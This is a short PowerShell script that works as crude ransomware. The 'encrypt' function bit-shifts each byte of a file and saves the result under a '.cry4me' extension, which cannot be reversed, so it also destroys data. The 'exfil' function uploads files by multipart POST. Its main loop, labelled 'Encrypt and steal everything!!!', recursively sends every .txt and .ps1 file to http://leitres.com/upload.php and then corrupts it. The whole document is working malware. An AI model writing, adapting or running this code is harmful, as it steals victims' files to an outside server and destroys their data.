function encrypt {
[CmdletBinding()]
Param (
    [Parameter(Mandatory=$true, Position=0)]
    [string] $arg1 #First File
) #end param

 Write-Host "file - $arg1"
# Read file as byte arrays
#$file1_b = [System.IO.File]::ReadAllBytes("$arg1") 
$file1_b=Get-Content -Path $arg1 -Encoding Byte
# Set the length 
$len = $file1_b.Count
$encrypt = New-Object Byte[] $len

# encrypt routine
for($i=0; $i -lt $len ; $i++)
{
    $encrypt[$i] = $file1_b[$i] -shl 2
}
 
# Write the encrypted bytes to the output file
$output=$arg1+".cry4me"
Write-Host "$output"
[System.IO.File]::WriteAllBytes($output,$encrypt)

}

function exfil {
[CmdletBinding()]
Param (
    [Parameter(Mandatory=$true, Position=0)]
    [string] $url, #First File
    [Parameter(Mandatory=$true, Position=1)]
    [string] $filepath#First File

) #end param


Invoke-WebRequest -UseBasicParsing -Uri $url `
-Method "POST" `
-WebSession $session `
-Headers @{
"Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  "Accept-Encoding"="gzip, deflate"
  "Accept-Language"="en-US,en;q=0.9"
  "Cache-Control"="max-age=0"
  "Upgrade-Insecure-Requests"="1"
} `
-ContentType "multipart/form-data; boundary=----WebKitFormBoundarySWo6ejpHkn9F8vEs" `
-Body ([System.Text.Encoding]::UTF8.GetBytes("------WebKitFormBoundarySWo6ejpHkn9F8vEs$([char]13)$([char]10)Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"[System.IO.Path]::GetFileName($filepath)`"$([char]13)$([char]10)Content-Type: text/x-python$([char]13)$([char]10)$([char]13)$([char]10)$([System.IO.File]::ReadAllBytes($filepath))$([char]13)$([char]10)------WebKitFormBoundarySWo6ejpHkn9F8vEs$([char]13)$([char]10)Content-Disposition: form-data; name=`"submit`"$([char]13)$([char]10)$([char]13)$([char]10)Upload File$([char]13)$([char]10)------WebKitFormBoundarySWo6ejpHkn9F8vEs--$([char]13)$([char]10)"))
}

#Encrypt and steal everything!!!

#foreach ($i in $(Get-ChildItem $Directory -recurse -Include *.txt | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName }))
foreach ($i in $(Get-ChildItem -recurse -Include ('*.txt', '*.ps1') | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName }))
{
exfil "http://leitres.com/upload.php" $i
encrypt $i
}